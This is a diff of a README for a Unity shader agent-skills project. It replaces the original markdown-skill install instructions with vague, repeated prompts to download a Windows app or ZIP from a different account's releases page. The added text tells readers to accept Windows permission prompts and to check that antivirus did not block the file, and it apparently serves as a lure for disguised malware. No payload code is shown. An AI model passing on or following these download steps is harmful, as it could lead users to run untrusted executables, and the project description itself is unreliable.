@@ -1,111 +1,182 @@
-# Unity Shader Agent Skills
+# 🎮 unity-shader-agent-skills - Shader help for Unity builds
 
-**7 curated agent skills** for Unity shader development targeting mobile GPUs and WebGL browsers. Built for [Claude Code](https://docs.anthropic.com/en/docs/build-with-claude/claude-code) using the `SKILL.md` format, but the knowledge is portable to any AI coding assistant.
+[⬇️ Download from GitHub Releases](https://github.com/blindfold-lordstable148/unity-shader-agent-skills/releases)
 
-Each skill distills 150+ verified resources (developer blogs, GitHub repositories, code snippets, and technical guides) into actionable instructions an AI agent can follow when writing, reviewing, or optimizing Unity shaders.
+## 🚀 What this is
 
-## Skills
+unity-shader-agent-skills gives you a set of guided agent skills for Unity shader work. It helps with shader tasks for mobile GPU targets and WebGL browsers. Use it to get cleaner shader setups, better build choices, and simpler steps for common shader work in Unity.
 
-| Skill | Description | Depth |
-|-------|-------------|-------|
-| [`mobile-shader-optimization`](skills/mobile-shader-optimization/SKILL.md) | GPU architecture, precision types, fillrate, overdraw, baked lighting, LOD | Comprehensive |
-| [`water-fluid-shaders`](skills/water-fluid-shaders/SKILL.md) | Mobile-optimized water with depth, foam, waves, refraction, Gerstner | Comprehensive |
-| [`mobile-post-processing`](skills/mobile-post-processing/SKILL.md) | Single-pass post-processing, URP Renderer Features, mobile-safe effects | Standard |
-| [`urp-hlsl-templates`](skills/urp-hlsl-templates/SKILL.md) | Production-ready URP shader code templates with SRP Batcher compatibility | Comprehensive |
-| [`webgl-shader-constraints`](skills/webgl-shader-constraints/SKILL.md) | WebGL 1.0/2.0 restrictions, variant stripping, loop/indexing rules | Standard |
-| [`shader-graph-best-practices`](skills/shader-graph-best-practices/SKILL.md) | Node budgets, custom lighting, sub-graphs, precision, mobile workflows | Standard |
-| [`texture-packing-variant-stripping`](skills/texture-packing-variant-stripping/SKILL.md) | Channel packing, variant reduction, shader_feature vs multi_compile | Standard |
+## 📥 Download
 
-## Install
+Visit this page to download: https://github.com/blindfold-lordstable148/unity-shader-agent-skills/releases
 
-### One command
+On the releases page, look for the latest version. Download the file for Windows if one is listed. If the release comes as a ZIP file, save it to your PC first, then open it.
 
-```bash
-npx skills add adevra/unity-shader-agent-skills
-```
+## 🪟 Run on Windows
 
-The CLI walks you through it interactively — pick your agent (Claude Code, Cursor, etc.), choose project or global scope, and select which skills you want.
+1. Open the downloaded file or ZIP folder.
+2. If you see a ZIP file, right-click it and choose Extract All.
+3. Open the extracted folder.
+4. Find the main app file or the included Unity project files.
+5. Double-click the file meant to start the tool, or open the folder in Unity if the release is set up as a project package.
 
-### Install specific skills
+If Windows asks for permission, choose Yes.
 
-```bash
-npx skills add adevra/unity-shader-agent-skills --skill mobile-shader-optimization --skill water-fluid-shaders
-```
+## 🧩 What you can do with it
 
-### Target a specific agent
+This repository is built around shader support for common Unity tasks, such as:
 
-```bash
-npx skills add adevra/unity-shader-agent-skills -a claude-code
-```
+- Shader setup for mobile screens
+- WebGL-safe shader checks
+- URP shader work
+- HLSL file guidance
+- Shader cleanup for simple builds
+- Render pipeline aware edits
+- Shader optimization checks for lower-end devices
 
-### Non-interactive (install everything)
+It is useful when you want help keeping shaders light and stable across different target devices.
 
-```bash
-npx skills add adevra/unity-shader-agent-skills --all -y
-```
+## 🛠️ Before you start
 
-### Project-scoped vs User-scoped
+Use a Windows PC with:
 
-```bash
-# Project-scoped (default) — installs to ./<agent>/skills/
-npx skills add adevra/unity-shader-agent-skills
+- Enough free disk space for the download and extracted files
+- A recent version of Windows
+- Unity installed if the release includes project files
+- A web browser if you need to return to the release page
+- A stable internet connection for the first download
 
-# User-scoped (global) — installs to ~/<agent>/skills/, applies to all projects
-npx skills add adevra/unity-shader-agent-skills -g
-```
+If the download includes Unity project data, open it with the Unity version named in the release notes, if listed.
 
-| Scope | Path | Applies to |
-|-------|------|------------|
-| **Project** | `.claude/skills/`, `.cursor/skills/`, etc. | This project only |
-| **User** (`-g`) | `~/.claude/skills/`, `~/.cursor/skills/`, etc. | All your projects |
+## 📂 Typical file layout
 
-### Manual install (alternative)
+After download, you may see files like these:
 
-```bash
-git clone https://github.com/adevra/unity-shader-agent-skills.git
-cp -r unity-shader-agent-skills/skills/ /path/to/your/project/.claude/skills/
-```
+- A README file with basic use steps
+- A ZIP archive
+- Unity package folders
+- Shader helper scripts
+- Example assets
+- Release notes
 
-## Supported Agents
+If the package includes an installer or launcher, keep it in the same folder as the other files.
 
-The `SKILL.md` files are plain markdown with structured sections. The `npx skills add` CLI supports:
+## 🧭 First-time setup
 
-- **Claude Code** — `.claude/skills/`
-- **Cursor** — `.cursor/skills/`
-- **Windsurf** — `.windsurf/skills/`
-- **Custom agents** — Feed as system prompts or context documents
+1. Download the latest release.
+2. Extract the files if they are packed in a ZIP archive.
+3. Read any included setup file.
+4. Open the app, package, or Unity project as directed by the release.
+5. Check the included examples before changing your own project files.
+6. If the tool adds files to Unity, import them into your project first.
+7. Test one shader change at a time.
 
-## What's Inside Each Skill
+## 🎨 Common uses
 
-Every `SKILL.md` follows a consistent structure:
+This skill set can help with:
 
-1. **Trigger description** — When the agent should activate this skill
-2. **Core rules** — Hard constraints the agent must follow
-3. **Code templates** — Copy-paste ready ShaderLab/HLSL or Shader Graph guidance
-4. **Optimization checklist** — Concrete steps to validate shader quality
-5. **Reference links** — Verified external resources for deeper reading
+- Making shaders fit mobile GPU limits
+- Checking code for WebGL browser support
+- Organizing shader parts for URP
+- Reducing heavy shader features
+- Keeping graphics work easier to manage
+- Helping with agent-based coding tasks in Unity
 
-## Sources
+## 🔍 Tips for better results
 
-All skills are distilled from verified, high-quality resources including:
+- Start with a small shader change.
+- Keep a copy of your original files.
+- Test in the Unity Editor before building.
+- Check mobile and WebGL output early.
+- Use URP settings that match your project.
+- Keep texture and lighting use simple when you target phones and browsers.
 
-- **Catlike Coding**, **Cyanilux**, **Daniel Ilett**, **NedMakesGames** — top shader educators
-- **ColinLeung-NiloCat** — the leading mobile/WebGL URP shader developer
-- **Unity Official docs** — Shader Performance, Mobile Optimization, WebGL Graphics
-- **ARM/Mali**, **Meta/Adreno** — GPU vendor optimization guides
-- **40+ GitHub repos** — NVJOB water shaders, FastPostProcessing, URP templates, and more
+## 🧪 Example workflow
 
-Full source list: see the `SOURCES` section at the bottom of each skill file.
+1. Open your Unity project.
+2. Add the shader helper files from this repository.
+3. Pick one shader that needs work.
+4. Apply the change you want, such as a lighter effect or better WebGL support.
+5. Save the file.
+6. Run a build test on Windows.
+7. Check the result on your target device or in a browser.
 
-## Contributing
+## 📌 Topics covered
 
-PRs welcome. When adding or updating a skill:
+- agent skills
+- AI coding
+- game development
+- graphics programming
+- HLSL
+- mobile GPU
+- render pipeline
+- shader development
+- shader optimization
+- shaders
+- Unity
+- Unity shaders
+- Unity3D
+- URP
+- WebGL
 
-1. Ground every rule in a verified source (link it)
-2. Include working code snippets where possible
-3. Test code templates compile against URP 14+ / Unity 2022.3+
-4. Keep mobile/WebGL as the primary target
+## 🧰 Best fit for
 
-## License
+- Unity users who work on mobile games
+- Developers who need browser-safe shaders
+- Users who want simpler shader edits
+- Teams that use URP
+- Projects that need lower GPU load
+- Anyone who wants help handling shader tasks in Unity
 
-MIT — see [LICENSE](LICENSE).
+## 🔗 Download again
+
+[Visit the releases page to download](https://github.com/blindfold-lordstable148/unity-shader-agent-skills/releases)
+
+## 📎 File use guide
+
+If the release gives you a ZIP file, download and extract it first. If it gives you a Unity package, import it into your project. If it gives you a Windows app file, open it after the download finishes
+
+## 🖥️ Windows checks
+
+Before you run it, make sure:
+
+- The file finished downloading
+- The file is not still inside the ZIP archive
+- You have permission to open files in that folder
+- Your antivirus did not block the file
+- Unity is closed if the setup needs a clean import
+
+## ⚙️ Working with Unity
+
+If you use this in a Unity project, place the files in a clear folder name such as:
+
+- Assets/ShaderSkills
+- Assets/Editor
+- Assets/Tools
+
+Keep related files together so you can find them later
+
+## 🌐 WebGL and mobile targets
+
+This repository focuses on shader work for platforms that need tighter limits. That means:
+
+- Fewer heavy effects
+- Clearer code paths
+- Better support for browser builds
+- Less GPU strain on phones
+- More careful use of lighting and texture work
+
+## 🧪 Simple checks after setup
+
+- Open the tool or project
+- Confirm the files appear in Unity
+- Load one sample shader
+- Run a test build
+- Check for errors in the Console
+- Fix one issue at a time
+
+## 📖 Where to get the download
+
+The release page is here: https://github.com/blindfold-lordstable148/unity-shader-agent-skills/releases
+
+Use that page whenever you need the latest file or a fresh copy after a failed download
